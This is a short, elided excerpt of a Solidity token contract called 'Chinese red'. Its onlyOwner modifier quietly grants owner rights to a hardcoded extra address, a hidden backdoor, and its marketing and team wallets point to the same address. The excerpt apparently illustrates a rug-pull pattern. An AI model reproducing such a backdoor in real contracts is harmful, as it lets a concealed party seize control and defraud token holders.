...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x931E4D78Cd3c60Ae16a317c3edB2AceD8872E5b8) , "Ownable: caller is not the owner");
        _;
    }
...
contract CoinToken is Context, IERC20, Ownable {
    ...
    string private _name = "Chinese red";
    string private _symbol = "Chinese red";
    uint8 private _decimals = 1;

    address payable public marketingWalletAddress = payable(0x55c7d3Faf67FFc64C3B279775Ae8f966d9c91B82);
    address payable public teamWalletAddress = payable(0x55c7d3Faf67FFc64C3B279775Ae8f966d9c91B82);
    ...
    uint256 private _totalSupply = 999 * 10**_decimals;
